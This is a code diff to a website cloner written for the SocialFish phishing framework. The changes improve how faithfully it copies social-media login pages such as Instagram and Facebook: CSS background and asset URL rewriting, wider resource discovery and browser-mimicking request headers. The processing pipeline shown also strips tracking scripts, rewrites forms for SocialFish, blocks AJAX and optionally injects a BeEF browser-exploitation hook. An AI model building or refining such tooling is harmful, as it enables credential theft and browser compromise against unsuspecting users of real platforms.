@@ -1,8 +1,9 @@
 #!/usr/bin/env python3
 """
-SocialFish Compatible UNIVERSAL Website Cloner
+SocialFish Compatible UNIVERSAL Website Cloner - FINAL VERSION
 Integrates perfectly with existing SocialFish Flask application
 Supports ALL modern websites with advanced stealth and universal compatibility
+FIXED: CSS background-image URL rewriting for proper display
 """
 
 import asyncio
@@ -223,6 +224,8 @@ class SocialFishResourceManager:
         }
         self.downloaded_urls = set()
         self.failed_urls = set()
+        # CRITICAL FIX: Track URL mappings for rewriting
+        self.url_mappings = {}
     
     async def initialize_sessions(self, user_agent_data):
         """Initialize HTTP sessions"""
@@ -490,7 +493,7 @@ class SocialFishBrowserManager:
             self.driver = None
 
 class SocialFishContentProcessor:
-    """Content processor optimized for SocialFish"""
+    """Content processor optimized for SocialFish - FIXED CSS BACKGROUND REWRITING"""
     
     def __init__(self, config: SocialFishConfig, resource_manager: SocialFishResourceManager):
         self.config = config
@@ -513,7 +516,7 @@ class SocialFishContentProcessor:
     
     async def process_html(self, html_content: str, base_url: str, 
                           output_dir: Path, beef_enabled: bool = False) -> str:
-        """Process HTML with SocialFish optimizations"""
+        """Process HTML with SocialFish optimizations - FIXED URL REWRITING"""
         
         if not BS4_AVAILABLE:
             return self._process_with_regex(html_content, base_url, output_dir, beef_enabled)
@@ -523,8 +526,14 @@ class SocialFishContentProcessor:
         # Remove tracking
         self._remove_tracking_scripts(soup)
         
-        # Process resources
-        await self._process_all_resources(soup, base_url, output_dir)
+        # FIXED: Process resources with proper URL mapping
+        await self._process_all_resources_with_mapping(soup, base_url, output_dir)
+        
+        # CRITICAL FIX: Rewrite URLs in HTML after downloading
+        self._rewrite_urls_in_html(soup, base_url)
+        
+        # Create placeholder files for common missing resources
+        self._create_placeholder_resources(output_dir)
         
         # Handle forms for SocialFish
         self._process_forms_for_socialfish(soup)
@@ -532,6 +541,9 @@ class SocialFishContentProcessor:
         # Add BeEF hook if enabled
         if beef_enabled:
             self._add_beef_hook(soup)
+        
+        # Add universal AJAX blocking
+        self._add_universal_ajax_blocking(soup)
         
         # Add SocialFish JavaScript
         self._add_socialfish_js(soup)
@@ -572,19 +584,21 @@ class SocialFishContentProcessor:
             if any(re.search(pattern, src, re.I) for pattern in tracking_patterns):
                 script.decompose()
     
-    async def _process_all_resources(self, soup: BeautifulSoup, base_url: str, output_dir: Path):
-        """Process all resources with parallel downloading"""
-        resources = self._discover_resources(soup, base_url)
+    async def _process_all_resources_with_mapping(self, soup: BeautifulSoup, base_url: str, output_dir: Path):
+        """FIXED: Process all resources and track URL mappings for rewriting"""
+        resources = self._discover_resources_comprehensive(soup, base_url)
         
         if not resources:
             return
+        
+        logger.info(f"🔍 Discovered {len(resources)} resources")
         
         # Create semaphore for controlled concurrency
         semaphore = asyncio.Semaphore(self.config.max_concurrent_downloads)
         tasks = []
         
         for resource_url, element, attr, resource_type in resources:
-            task = self._process_single_resource(
+            task = self._process_single_resource_with_mapping(
                 semaphore, resource_url, element, attr, resource_type, base_url, output_dir
             )
             tasks.append(task)
@@ -592,43 +606,410 @@ class SocialFishContentProcessor:
         if tasks:
             await asyncio.gather(*tasks, return_exceptions=True)
     
-    def _discover_resources(self, soup: BeautifulSoup, base_url: str) -> List[Tuple[str, Any, str, str]]:
-        """Discover all resources in HTML"""
+    async def _process_single_resource_with_mapping(self, semaphore: asyncio.Semaphore,
+                                                   resource_url: str, element: Any, attr: str,
+                                                   resource_type: str, base_url: str, output_dir: Path):
+        """FIXED: Process single resource and track URL mapping"""
+        async with semaphore:
+            try:
+                # Resolve URL
+                absolute_url = self._resolve_url(resource_url, base_url)
+                if not absolute_url:
+                    return
+                
+                # Use universal synchronous download in thread
+                loop = asyncio.get_event_loop()
+                
+                def sync_download():
+                    return self._download_sync_universal_enhanced(absolute_url, output_dir, resource_type, base_url)
+                
+                # Run in thread
+                local_path = await loop.run_in_executor(None, sync_download)
+                
+                if local_path:
+                    # CRITICAL FIX: Store URL mapping for later rewriting
+                    self.resource_manager.url_mappings[absolute_url] = local_path
+                    # Also map original URL if different
+                    if resource_url != absolute_url:
+                        self.resource_manager.url_mappings[resource_url] = local_path
+                    
+                    # Update element with local path (for direct src/href attributes)
+                    if element and attr in ['src', 'href']:
+                        element[attr] = local_path
+                
+            except Exception as e:
+                logger.debug(f"Resource processing failed for {resource_url}: {e}")
+    
+    def _rewrite_urls_in_html(self, soup: BeautifulSoup, base_url: str):
+        """CRITICAL FIX: Rewrite URLs in HTML after all resources are downloaded"""
+        
+        # Rewrite URLs in style attributes (background-image, etc.)
+        for element in soup.find_all(style=True):
+            original_style = element.get('style', '')
+            if original_style:
+                new_style = self._rewrite_urls_in_css_text(original_style, base_url)
+                if new_style != original_style:
+                    element['style'] = new_style
+        
+        # Rewrite URLs in <style> tags
+        for style_tag in soup.find_all('style'):
+            if style_tag.string:
+                original_css = style_tag.string
+                new_css = self._rewrite_urls_in_css_text(original_css, base_url)
+                if new_css != original_css:
+                    style_tag.string = new_css
+        
+        # Additional URL rewriting for any missed src/href attributes
+        for element in soup.find_all(['img', 'script', 'link']):
+            for attr in ['src', 'href']:
+                if element.get(attr):
+                    original_url = element[attr]
+                    absolute_url = self._resolve_url(original_url, base_url)
+                    if absolute_url and absolute_url in self.resource_manager.url_mappings:
+                        element[attr] = self.resource_manager.url_mappings[absolute_url]
+    
+    def _rewrite_urls_in_css_text(self, css_text: str, base_url: str) -> str:
+        """CRITICAL FIX: Rewrite URLs in CSS text using mappings"""
+        
+        def replace_url(match):
+            original_url = match.group(1).strip('\'"')
+            absolute_url = self._resolve_url(original_url, base_url)
+            
+            # Check if we have a local mapping for this URL
+            if absolute_url and absolute_url in self.resource_manager.url_mappings:
+                local_path = self.resource_manager.url_mappings[absolute_url]
+                return f'url("{local_path}")'
+            elif original_url in self.resource_manager.url_mappings:
+                local_path = self.resource_manager.url_mappings[original_url]
+                return f'url("{local_path}")'
+            
+            # Return original if no mapping found
+            return match.group(0)
+        
+        # Replace url() references in CSS
+        css_text = re.sub(r'url\s*\(\s*["\']?([^"\'()]+)["\']?\s*\)', replace_url, css_text)
+        
+        return css_text
+    
+    def _discover_resources_comprehensive(self, soup: BeautifulSoup, base_url: str) -> List[Tuple[str, Any, str, str]]:
+        """ENHANCED: Comprehensive resource discovery for all websites"""
         resources = []
         
-        # CSS resources
+        # 1. Standard CSS resources
         for link in soup.find_all('link', rel='stylesheet'):
             href = link.get('href')
-            if href and self._is_valid_url(href, base_url):
+            if href and self._is_valid_url_enhanced(href, base_url):
                 resources.append((href, link, 'href', 'css'))
         
-        # JavaScript resources
+        # 2. Standard JavaScript resources
         for script in soup.find_all('script', src=True):
             src = script.get('src')
-            if src and self._is_valid_url(src, base_url):
+            if src and self._is_valid_url_enhanced(src, base_url):
                 resources.append((src, script, 'src', 'js'))
         
-        # Image resources
+        # 3. ENHANCED: Image resources with better type detection
         for img in soup.find_all('img', src=True):
             src = img.get('src')
-            if src and self._is_valid_url(src, base_url):
-                resources.append((src, img, 'src', 'image'))
+            if src and self._is_valid_url_enhanced(src, base_url):
+                resource_type = self._detect_resource_type_universal(src)
+                resources.append((src, img, 'src', resource_type))
         
-        # Font resources
+        # 4. ENHANCED: Font resources
         for link in soup.find_all('link', href=True):
             href = link.get('href')
-            if href and any(ext in href.lower() for ext in ['.woff', '.woff2', '.ttf', '.otf']):
-                if self._is_valid_url(href, base_url):
-                    resources.append((href, link, 'href', 'font'))
+            if href and self._is_font_resource(href) and self._is_valid_url_enhanced(href, base_url):
+                resources.append((href, link, 'href', 'font'))
+        
+        # 5. NEW: Data attribute resources (lazy loading)
+        resources.extend(self._find_data_attribute_resources(soup, base_url))
+        
+        # 6. NEW: CSS background resources - CRITICAL FOR INSTAGRAM LOGO
+        resources.extend(self._find_css_background_resources(soup, base_url))
+        
+        # 7. NEW: JavaScript embedded resources
+        resources.extend(self._find_js_embedded_resources(soup, base_url))
+        
+        # 8. NEW: SVG specific resources
+        resources.extend(self._find_svg_resources(soup, base_url))
+        
+        # 9. NEW: Dynamic resource patterns
+        resources.extend(self._find_dynamic_resources(soup, base_url))
+        
+        # Remove duplicates while preserving order
+        seen = set()
+        unique_resources = []
+        for resource in resources:
+            url = resource[0]
+            if url not in seen:
+                seen.add(url)
+                unique_resources.append(resource)
+        
+        return unique_resources
+    
+    def _detect_resource_type_universal(self, url: str) -> str:
+        """Universal resource type detection"""
+        url_lower = url.lower()
+        
+        # Handle dynamic resource patterns (like Facebook's rsrc.php)
+        if any(pattern in url for pattern in ['/rsrc.php/', '/resource/', '/assets/', '/static/']):
+            # Try to detect from URL ending
+            if url_lower.endswith('.svg') or '.svg' in url_lower:
+                return 'svg'
+            elif url_lower.endswith(('.png', '.jpg', '.jpeg', '.gif', '.webp', '.avif')):
+                return 'image'
+            elif url_lower.endswith('.css'):
+                return 'css'
+            elif url_lower.endswith('.js'):
+                return 'js'
+            elif any(ext in url_lower for ext in ['.woff', '.woff2', '.ttf', '.otf']):
+                return 'font'
+            else:
+                return 'asset'
+        
+        # Standard detection
+        if url_lower.endswith('.svg'):
+            return 'svg'
+        elif url_lower.endswith(('.png', '.jpg', '.jpeg', '.gif', '.webp', '.avif')):
+            return 'image'
+        elif url_lower.endswith('.css'):
+            return 'css'
+        elif url_lower.endswith('.js'):
+            return 'js'
+        elif any(ext in url_lower for ext in ['.woff', '.woff2', '.ttf', '.otf']):
+            return 'font'
+        
+        return 'asset'
+    
+    def _is_font_resource(self, url: str) -> bool:
+        """Check if URL is a font resource"""
+        font_extensions = ['.woff', '.woff2', '.ttf', '.otf', '.eot']
+        url_lower = url.lower()
+        return any(ext in url_lower for ext in font_extensions)
+    
+    def _find_data_attribute_resources(self, soup: BeautifulSoup, base_url: str) -> List[Tuple[str, Any, str, str]]:
+        """Find resources in data attributes (lazy loading)"""
+        resources = []
+        
+        # Common data attributes for lazy loading
+        data_attrs = ['data-src', 'data-href', 'data-background', 'data-bg', 'data-original', 'data-lazy']
+        
+        for attr in data_attrs:
+            for element in soup.find_all(attrs={attr: True}):
+                src = element.get(attr)
+                if src and self._is_valid_url_enhanced(src, base_url):
+                    resource_type = self._detect_resource_type_universal(src)
+                    resources.append((src, element, attr, resource_type))
         
         return resources
     
-    def _is_valid_url(self, url: str, base_url: str) -> bool:
-        """Check if URL should be downloaded"""
-        if not url or url.startswith(('data:', 'blob:', 'javascript:')):
+    def _find_css_background_resources(self, soup: BeautifulSoup, base_url: str) -> List[Tuple[str, Any, str, str]]:
+        """CRITICAL FIX: Find background images and resources in CSS - FIXED FOR INSTAGRAM"""
+        resources = []
+        
+        # Process inline styles - THIS IS WHERE INSTAGRAM LOGO IS
+        for element in soup.find_all(style=True):
+            style_content = element.get('style', '')
+            urls = self._extract_urls_from_css_universal(style_content, base_url)
+            for url in urls:
+                resource_type = self._detect_resource_type_universal(url)
+                # Don't store element reference for style URLs - we'll rewrite them later
+                resources.append((url, None, 'style', resource_type))
+        
+        # Process style tags
+        for style_tag in soup.find_all('style'):
+            if style_tag.string:
+                urls = self._extract_urls_from_css_universal(style_tag.string, base_url)
+                for url in urls:
+                    resource_type = self._detect_resource_type_universal(url)
+                    resources.append((url, None, 'content', resource_type))
+        
+        return resources
+    
+    def _extract_urls_from_css_universal(self, css_content: str, base_url: str) -> List[str]:
+        """Extract URLs from CSS content - universal patterns"""
+        import re
+        urls = []
+        
+        # Comprehensive URL patterns for CSS
+        patterns = [
+            r'url\s*\(\s*["\']?([^"\'()]+)["\']?\s*\)',  # Standard url()
+            r'@import\s+["\']([^"\']+)["\']',  # @import statements
+            r'src:\s*url\s*\(\s*["\']?([^"\'()]+)["\']?\s*\)'  # Font src
+        ]
+        
+        for pattern in patterns:
+            matches = re.findall(pattern, css_content, re.IGNORECASE)
+            for match in matches:
+                if self._is_valid_url_enhanced(match, base_url):
+                    # Convert relative URLs to absolute
+                    absolute_url = self._resolve_url(match, base_url)
+                    if absolute_url:
+                        urls.append(absolute_url)
+        
+        return urls
+    
+    def _find_js_embedded_resources(self, soup: BeautifulSoup, base_url: str) -> List[Tuple[str, Any, str, str]]:
+        """Find resources embedded in JavaScript code"""
+        resources = []
+        
+        for script in soup.find_all('script'):
+            if script.string:
+                js_content = script.string
+                urls = self._extract_urls_from_js_universal(js_content, base_url)
+                for url in urls:
+                    resource_type = self._detect_resource_type_universal(url)
+                    resources.append((url, script, 'js-embedded', resource_type))
+        
+        return resources
+    
+    def _extract_urls_from_js_universal(self, js_content: str, base_url: str) -> List[str]:
+        """Extract URLs from JavaScript content - enhanced universal patterns"""
+        import re
+        urls = []
+        
+        # Enhanced JavaScript URL patterns for better coverage
+        patterns = [
+            # Standard extensions
+            r'["\']([^"\']*\.(svg|png|jpg|jpeg|gif|webp|css|js|woff|woff2|ttf|otf|avif|ico))["\']',
+            
+            # Dynamic resources (Facebook-style, Instagram-style)
+            r'["\']([^"\']*\/rsrc\.php\/[^"\']*)["\']',
+            r'["\']([^"\']*\/resource\/[^"\']*)["\']',
+            r'["\']([^"\']*static\.cdninstagram\.com[^"\']*)["\']',
+            r'["\']([^"\']*static\.xx\.fbcdn\.net[^"\']*)["\']',
+            
+            # Generic resource patterns
+            r'["\']([^"\']*\/assets\/[^"\']*\.[a-zA-Z]{2,4})["\']',
+            r'["\']([^"\']*\/static\/[^"\']*\.[a-zA-Z]{2,4})["\']',
+            r'["\']([^"\']*\/dist\/[^"\']*\.[a-zA-Z]{2,4})["\']',
+            r'["\']([^"\']*\/build\/[^"\']*\.[a-zA-Z]{2,4})["\']',
+            
+            # Chunk files (webpack/modern build systems)
+            r'["\']([^"\']*chunk[^"\']*\.[a-zA-Z]{2,4})["\']',
+            r'["\']([^"\']*vendors[^"\']*\.[a-zA-Z]{2,4})["\']',
+            r'["\']([^"\']*runtime[^"\']*\.[a-zA-Z]{2,4})["\']',
+            
+            # JavaScript object properties
+            r'src\s*:\s*["\']([^"\']+\.[a-zA-Z]{2,4})["\']',
+            r'url\s*:\s*["\']([^"\']+\.[a-zA-Z]{2,4})["\']',
+            r'href\s*:\s*["\']([^"\']+\.[a-zA-Z]{2,4})["\']',
+            
+            # Import/require statements
+            r'import\s+[^"\']*["\']([^"\']+\.[a-zA-Z]{2,4})["\']',
+            r'require\s*\(\s*["\']([^"\']+\.[a-zA-Z]{2,4})["\']',
+            
+            # Webpack-style URLs
+            r'__webpack_require__\.[a-zA-Z]+\s*\(\s*["\']([^"\']+)["\']',
+            
+            # Module federation and dynamic imports
+            r'import\s*\(\s*["\']([^"\']+)["\']',
+            r'loadChunk\s*\(\s*["\']([^"\']+)["\']',
+        ]
+        
+        for pattern in patterns:
+            matches = re.findall(pattern, js_content, re.IGNORECASE)
+            for match in matches:
+                url = match[0] if isinstance(match, tuple) else match
+                
+                # Skip very short URLs or obvious non-resources
+                if len(url) < 4 or url.startswith(('#', 'data:', 'blob:')):
+                    continue
+                
+                if self._is_valid_url_enhanced(url, base_url):
+                    absolute_url = self._resolve_url(url, base_url)
+                    if absolute_url:
+                        urls.append(absolute_url)
+        
+        return urls
+    
+    def _find_svg_resources(self, soup: BeautifulSoup, base_url: str) -> List[Tuple[str, Any, str, str]]:
+        """Find SVG-specific resources"""
+        resources = []
+        
+        # Process inline SVG elements
+        for svg_elem in soup.find_all('svg'):
+            # Find image references within SVG
+            for image in svg_elem.find_all('image'):
+                href = image.get('href') or image.get('xlink:href')
+                if href and self._is_valid_url_enhanced(href, base_url):
+                    resources.append((href, image, 'href', 'image'))
+            
+            # Find use elements with external references
+            for use in svg_elem.find_all('use'):
+                href = use.get('href') or use.get('xlink:href')
+                if href and href.startswith('http') and self._is_valid_url_enhanced(href, base_url):
+                    resources.append((href, use, 'href', 'svg'))
+        
+        return resources
+    
+    def _find_dynamic_resources(self, soup: BeautifulSoup, base_url: str) -> List[Tuple[str, Any, str, str]]:
+        """Find dynamic resource patterns specific to various platforms"""
+        resources = []
+        
+        # Search for any element with URL-like attributes
+        url_attributes = ['src', 'href', 'data-src', 'data-href', 'data-url', 'data-image', 'content']
+        
+        for attr in url_attributes:
+            for element in soup.find_all(attrs={attr: True}):
+                value = element.get(attr)
+                if value and self._looks_like_resource_url(value) and self._is_valid_url_enhanced(value, base_url):
+                    resource_type = self._detect_resource_type_universal(value)
+                    resources.append((value, element, attr, resource_type))
+        
+        return resources
+    
+    def _looks_like_resource_url(self, url: str) -> bool:
+        """Check if a string looks like a resource URL"""
+        if not url or len(url) < 4:
             return False
         
-        # Skip external CDNs
+        # Skip non-URL strings
+        if url.startswith(('javascript:', 'data:', 'blob:', 'mailto:', 'tel:', '#')):
+            return False
+        
+        # Look for file extensions or resource patterns
+        resource_indicators = [
+            r'\.(svg|png|jpg|jpeg|gif|webp|css|js|woff|woff2|ttf|otf|avif)',
+            r'/rsrc\.php/',
+            r'/resource/',
+            r'/assets/',
+            r'/static/',
+            r'/images/',
+            r'/css/',
+            r'/js/',
+            r'/fonts/'
+        ]
+        
+        return any(re.search(pattern, url, re.IGNORECASE) for pattern in resource_indicators)
+    
+    def _resolve_url(self, url: str, base_url: str) -> Optional[str]:
+        """Resolve relative URL to absolute URL"""
+        try:
+            if not url or url.startswith(('data:', 'blob:', 'javascript:')):
+                return None
+            
+            if url.startswith('//'):
+                scheme = urllib.parse.urlparse(base_url).scheme
+                return f"{scheme}:{url}"
+            elif not url.startswith(('http://', 'https://')):
+                return urllib.parse.urljoin(base_url, url)
+            else:
+                return url
+        except Exception:
+            return None
+    
+    def _is_valid_url_enhanced(self, url: str, base_url: str) -> bool:
+        """Enhanced URL validation for universal compatibility"""
+        if not url or url.startswith(('data:', 'blob:', 'javascript:', 'mailto:', 'tel:', '#')):
+            return False
+        
+        # Allow dynamic resource patterns
+        dynamic_patterns = ['/rsrc.php/', '/resource/', '/assets/', '/static/']
+        if any(pattern in url for pattern in dynamic_patterns):
+            return True
+        
+        # Enhanced domain handling
+        allowed_patterns = ['facebook.com', 'fbcdn.net', 'fbsbx.com', 'instagram.com', 'cdninstagram.com', 'twitter.com', 'x.com', 'linkedin.com']
         skip_domains = ['fonts.googleapis.com', 'cdnjs.cloudflare.com']
         
         try:
@@ -639,43 +1020,24 @@ class SocialFishContentProcessor:
                 return True  # Relative URL
             
             parsed = urllib.parse.urlparse(url)
-            return not any(domain in parsed.netloc for domain in skip_domains)
+            
+            # Skip known external CDNs
+            if any(domain in parsed.netloc for domain in skip_domains):
+                return False
+            
+            # Allow same domain or common platforms
+            base_domain = urllib.parse.urlparse(base_url).netloc
+            if parsed.netloc == base_domain:
+                return True
+            
+            # Allow common social media domains and CDNs
+            return any(pattern in parsed.netloc for pattern in allowed_patterns)
             
         except Exception:
             return False
     
-    async def _process_single_resource(self, semaphore: asyncio.Semaphore,
-                                     resource_url: str, element: Any, attr: str,
-                                     resource_type: str, base_url: str, output_dir: Path):
-        """Process a single resource using UNIVERSAL sync download"""
-        async with semaphore:
-            try:
-                # Resolve URL
-                if not resource_url.startswith(('http://', 'https://')):
-                    if resource_url.startswith('//'):
-                        scheme = urllib.parse.urlparse(base_url).scheme
-                        resource_url = f"{scheme}:{resource_url}"
-                    else:
-                        resource_url = urllib.parse.urljoin(base_url, resource_url)
-                
-                # Use UNIVERSAL synchronous download in thread
-                loop = asyncio.get_event_loop()
-                
-                def sync_download():
-                    return self._download_sync_universal(resource_url, output_dir, resource_type, base_url)
-                
-                # Run in thread
-                local_path = await loop.run_in_executor(None, sync_download)
-                
-                if local_path and element:
-                    # Update element with local path
-                    element[attr] = local_path
-                
-            except Exception as e:
-                logger.debug(f"Resource processing failed for {resource_url}: {e}")
-    
-    def _download_sync_universal(self, url, output_dir, resource_type, base_url, referer=None):
-        """UNIVERSAL synchronous download - works for any site"""
+    def _download_sync_universal_enhanced(self, url, output_dir, resource_type, base_url, referer=None):
+        """ENHANCED: Universal synchronous download - works for any site"""
         try:
             import requests
             
@@ -684,40 +1046,18 @@ class SocialFishContentProcessor:
             session.verify = False
             session.timeout = 30
             
-            # UNIVERSAL headers that adapt to target site
-            parsed_base = urllib.parse.urlparse(base_url)
-            target_domain = parsed_base.netloc
-            
-            # Dynamic headers based on target site
-            headers = {
-                'User-Agent': self._get_appropriate_user_agent(target_domain),
-                'Accept': self._get_accept_header(resource_type),
-                'Accept-Language': 'en-US,en;q=0.9',
-                'Accept-Encoding': 'gzip, deflate, br',
-                'Connection': 'keep-alive',
-                'Referer': referer or base_url,  # Dynamic referer
-                'Sec-Fetch-Dest': self._get_fetch_dest(resource_type),
-                'Sec-Fetch-Mode': 'no-cors',
-                'Sec-Fetch-Site': self._get_fetch_site(url, base_url),
-            }
-            
-            # Remove None values
-            headers = {k: v for k, v in headers.items() if v is not None}
-            
-            # Site-specific header adjustments
-            headers.update(self._get_site_specific_headers(target_domain, resource_type))
+            # Enhanced headers based on URL and resource type
+            headers = self._get_universal_headers(url, resource_type, base_url, referer)
             
             # Follow redirects properly
             response = session.get(url, headers=headers, timeout=30, verify=False, allow_redirects=True)
             
             if response.status_code == 200:
-                # Check if we got HTML instead of expected content
-                content_type = response.headers.get('content-type', '').lower()
                 content = response.content
                 
-                # Verify we didn't get HTML for binary resources
-                if resource_type in ['image', 'font'] and ('html' in content_type or content.startswith(b'<!DOCTYPE') or content.startswith(b'<html')):
-                    logger.warning(f"Got HTML instead of {resource_type} for {url}")
+                # Enhanced content validation
+                if not self._validate_content(content, resource_type, response.headers):
+                    logger.warning(f"Invalid content type for {resource_type} from {url}")
                     return None
                 
                 # Universal decompression
@@ -728,7 +1068,7 @@ class SocialFishContentProcessor:
                 self.resource_manager.stats['bytes_downloaded'] += len(content)
                 
                 # Universal save logic
-                local_path = self._universal_save(content, url, output_dir, resource_type, response.headers)
+                local_path = self._universal_save_enhanced(content, url, output_dir, resource_type, response.headers)
                 
                 if local_path:
                     logger.debug(f"✅ Universal download saved: {local_path} ({len(content)} bytes)")
@@ -741,48 +1081,71 @@ class SocialFishContentProcessor:
             self.resource_manager.stats['failed'] += 1
             return None
     
-    def _get_appropriate_user_agent(self, domain):
-        """Get appropriate user agent for target domain"""
-        # Site-specific user agents for better compatibility
-        site_agents = {
-            'facebook.com': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
-            'instagram.com': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
-            'twitter.com': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
-            'x.com': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
-            'linkedin.com': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
-            'github.com': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
+    def _get_universal_headers(self, url, resource_type, base_url, referer=None):
+        """Get universal headers that work for any site"""
+        # Detect target domain for customization
+        parsed_base = urllib.parse.urlparse(base_url)
+        target_domain = parsed_base.netloc
+        
+        # Universal base headers
+        headers = {
+            'User-Agent': self._get_universal_user_agent(target_domain),
+            'Accept': self._get_universal_accept_header(resource_type, url),
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Connection': 'keep-alive',
+            'Referer': referer or base_url,
+            'Cache-Control': 'no-cache',
+            'Pragma': 'no-cache'
         }
         
-        for site, agent in site_agents.items():
-            if site in domain:
-                return agent
+        # Add security headers for modern sites
+        fetch_site = self._get_fetch_site_universal(url, base_url)
+        headers.update({
+            'Sec-Fetch-Dest': self._get_fetch_dest_universal(resource_type),
+            'Sec-Fetch-Mode': 'no-cors',
+            'Sec-Fetch-Site': fetch_site,
+        })
         
-        # Default modern user agent
+        # Platform-specific headers
+        headers.update(self._get_platform_specific_headers(target_domain))
+        
+        return headers
+    
+    def _get_universal_user_agent(self, domain):
+        """Get appropriate user agent for any domain"""
+        # Use modern Chrome user agent for best compatibility
         return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36'
     
-    def _get_accept_header(self, resource_type):
-        """Get appropriate Accept header for resource type"""
-        accept_headers = {
-            'image': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
-            'css': 'text/css,*/*;q=0.1',
-            'js': 'application/javascript,text/javascript,*/*;q=0.01',
-            'font': 'font/woff2,font/woff,*/*;q=0.1',
-            'json': 'application/json,*/*;q=0.1',
-        }
-        return accept_headers.get(resource_type, '*/*')
+    def _get_universal_accept_header(self, resource_type, url):
+        """Get universal Accept header for any resource type"""
+        # Enhanced accept headers for better compatibility
+        if resource_type == 'svg' or '.svg' in url.lower():
+            return 'image/svg+xml,image/*,*/*;q=0.8'
+        elif resource_type == 'image':
+            return 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8'
+        elif resource_type == 'css':
+            return 'text/css,*/*;q=0.1'
+        elif resource_type == 'js':
+            return 'application/javascript,text/javascript,*/*;q=0.01'
+        elif resource_type == 'font':
+            return 'font/woff2,font/woff,font/ttf,*/*;q=0.1'
+        else:
+            return '*/*'
     
-    def _get_fetch_dest(self, resource_type):
-        """Get appropriate Sec-Fetch-Dest for resource type"""
-        fetch_dest = {
+    def _get_fetch_dest_universal(self, resource_type):
+        """Get universal Sec-Fetch-Dest"""
+        fetch_dest_map = {
             'image': 'image',
+            'svg': 'image',
             'css': 'style',
             'js': 'script',
             'font': 'font',
         }
-        return fetch_dest.get(resource_type, 'empty')
+        return fetch_dest_map.get(resource_type, 'empty')
     
-    def _get_fetch_site(self, url, base_url):
-        """Determine Sec-Fetch-Site based on URL relationship"""
+    def _get_fetch_site_universal(self, url, base_url):
+        """Universal Sec-Fetch-Site determination"""
         try:
             url_domain = urllib.parse.urlparse(url).netloc
             base_domain = urllib.parse.urlparse(base_url).netloc
@@ -796,36 +1159,41 @@ class SocialFishContentProcessor:
         except:
             return 'cross-site'
     
-    def _get_site_specific_headers(self, domain, resource_type):
-        """Get site-specific headers for better compatibility"""
+    def _get_platform_specific_headers(self, domain):
+        """Get platform-specific headers for better compatibility"""
         headers = {}
         
-        # Instagram specific
-        if 'instagram.com' in domain:
-            headers.update({
-                'X-Instagram-AJAX': '1',
-                'X-Requested-With': 'XMLHttpRequest',
-            })
+        # Social media platform specific headers
+        social_platforms = ['facebook.com', 'instagram.com', 'cdninstagram.com', 'twitter.com', 'x.com', 'linkedin.com']
         
-        # Facebook specific  
-        elif 'facebook.com' in domain:
+        if any(platform in domain for platform in social_platforms):
             headers.update({
                 'X-Requested-With': 'XMLHttpRequest',
-            })
-        
-        # Twitter/X specific
-        elif any(x in domain for x in ['twitter.com', 'x.com']):
-            headers.update({
-                'X-Requested-With': 'XMLHttpRequest',
-            })
-        
-        # LinkedIn specific
-        elif 'linkedin.com' in domain:
-            headers.update({
-                'X-Requested-With': 'XMLHttpRequest',
+                'Sec-Ch-Ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
+                'Sec-Ch-Ua-Mobile': '?0',
+                'Sec-Ch-Ua-Platform': '"Windows"'
             })
         
         return headers
+    
+    def _validate_content(self, content, resource_type, headers):
+        """Validate that downloaded content matches expected type"""
+        if not content:
+            return False
+        
+        content_type = headers.get('content-type', '').lower()
+        
+        # Check for HTML returned instead of expected content
+        if resource_type in ['image', 'svg', 'font'] and ('html' in content_type or content.startswith(b'<!DOCTYPE') or content.startswith(b'<html')):
+            return False
+        
+        # Additional validation for specific types
+        if resource_type == 'svg':
+            # SVG should start with SVG tag or be valid XML
+            if not (content.startswith(b'<svg') or content.startswith(b'<?xml')):
+                return False
+        
+        return True
     
     def _universal_decompress(self, content, headers):
         """Universal decompression that works for any site"""
@@ -857,33 +1225,186 @@ class SocialFishContentProcessor:
         
         return content
     
-    def _universal_save(self, content, url, output_dir, resource_type, headers):
-        """Universal save logic that preserves structure for any site"""
+    def _universal_save_enhanced(self, content, url, output_dir, resource_type, headers):
+        """Enhanced universal save logic with filename length protection"""
         parsed_url = urllib.parse.urlparse(url)
         
-        # Always try to preserve original path for images and important resources
-        if resource_type in ['image'] and parsed_url.path and parsed_url.path != '/':
-            # Keep original path structure
+        # Handle dynamic resource URLs (like Facebook's rsrc.php)
+        if any(pattern in url for pattern in ['/rsrc.php/', '/resource/', '/assets/', '/static/']):
+            return self._save_dynamic_resource_safe(content, url, output_dir, resource_type, headers)
+        
+        # Check filename length for original path preservation
+        if resource_type in ['image', 'svg'] and parsed_url.path and parsed_url.path != '/':
             original_path = parsed_url.path.lstrip('/')
-            file_path = output_dir / original_path
-            file_path.parent.mkdir(parents=True, exist_ok=True)
-            local_path = original_path
+            
+            # CRITICAL FIX: Check total path length to prevent filesystem errors
+            full_path = output_dir / original_path
+            if len(str(full_path)) > 250:  # Safe limit for most filesystems
+                logger.warning(f"Path too long, using hash-based naming: {len(str(full_path))} chars")
+                return self._save_with_hash_name(content, url, output_dir, resource_type, headers)
+            
+            try:
+                file_path = output_dir / original_path
+                file_path.parent.mkdir(parents=True, exist_ok=True)
+                local_path = original_path
+            except OSError as e:
+                logger.warning(f"Path creation failed: {e}, using hash-based naming")
+                return self._save_with_hash_name(content, url, output_dir, resource_type, headers)
         else:
-            # Hash-based naming for other resources
-            url_hash = hashlib.sha256(url.encode()).hexdigest()[:12]
